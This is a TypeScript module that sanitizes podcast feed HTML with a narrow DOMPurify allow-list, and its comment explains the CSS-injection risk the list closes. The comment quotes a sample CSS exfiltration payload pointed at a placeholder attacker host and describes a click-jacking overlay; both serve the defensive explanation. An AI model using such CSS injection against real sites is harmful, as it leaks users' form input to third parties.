// SPDX-License-Identifier: AGPL-3.0-or-later
// SPDX-FileCopyrightText: 2026 The Mosaicast Authors

import DOMPurify, { type Config } from 'dompurify';

/**
 * Sanitizes HTML that came from a feed — show notes and channel descriptions.
 *
 * **Whose HTML this is.** Whatever the podcast host publishes. Not the operator's, not the shell's: a feed is
 * fetched from a third party over the network and rendered with `dangerouslySetInnerHTML`. It is the one
 * place on the site where markup arrives from outside and is inserted as markup.
 *
 * **Why an explicit allow-list rather than DOMPurify's defaults.** The defaults are built to be safe against
 * *script execution*, and they are — but they permit the `style` attribute and the `<style>` element, filtering
 * CSS only for `expression()` and `behavior:`, not for `url()`. Combined with `style-src 'unsafe-inline'` in
 * the response CSP — which the plugin UI contract requires, because Web Components style their shadow roots
 * (see `PluginCspHeaderWriter`) — that made feed HTML a working stylesheet on the episode page. The reachable
 * consequences are not theoretical: `input[value^="a"]{background-image:url(https://attacker/a)}` exfiltrates
 * rendered form values one character at a time, and a fixed, full-viewport, high-z-index block is
 * click-jacking. `img-src` allows any `https:` origin, because artwork legitimately comes from arbitrary feed
 * hosts, so the outbound request that carries the stolen value is permitted too.
 *
 * Closing it here rather than in the CSP is deliberate. Dropping `'unsafe-inline'` would break every plugin
 * that styles itself; removing styling from *feed HTML* costs a publisher nothing they should have been doing.
 * Show notes are prose, links, lists and images — the tags below — and a podcast host that needs a stylesheet
 * to render its episode description is doing something the shell should not honour anyway.
 *
 * The allow-list is deliberately narrow and additive: adding a tag is a decision someone makes on purpose,
 * whereas inheriting a default profile is a decision nobody made.
 */
const FEED_HTML: Config = {
  ALLOWED_TAGS: [
    'a', 'abbr', 'b', 'blockquote', 'br', 'cite', 'code', 'dd', 'del', 'dl', 'dt', 'em', 'figcaption',
    'figure', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'hr', 'i', 'img', 'ins', 'kbd', 'li', 'ol', 'p', 'pre',
    'q', 's', 'samp', 'small', 'span', 'strong', 'sub', 'sup', 'table', 'tbody', 'td', 'tfoot', 'th',
    'thead', 'tr', 'u', 'ul', 'var',
  ],
  ALLOWED_ATTR: ['href', 'title', 'alt', 'src', 'width', 'height', 'lang', 'dir', 'colspan', 'rowspan'],
  // Belt and braces: these are already absent from ALLOWED_TAGS/ATTR, but naming them means a future edit
  // that widens the lists cannot quietly re-open the hole this function exists to close.
  FORBID_TAGS: ['style', 'script', 'iframe', 'object', 'embed', 'form', 'input', 'link', 'base'],
  FORBID_ATTR: ['style', 'srcset', 'formaction', 'ping'],
  // `javascript:` and `data:` in an href; DOMPurify's URI check handles the rest.
  ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|tel:|#|\/)/i,
};

/** Sanitizes feed-supplied HTML for rendering. Returns an empty string for absent or empty input. */
export function sanitizeFeedHtml(html: string | null | undefined): string {
  if (!html) {
    return '';
  }
  // `RETURN_TRUSTED_TYPE` is off, so this is a string — the overload just cannot prove it from a Config value.
  return DOMPurify.sanitize(html, FEED_HTML) as unknown as string;
}
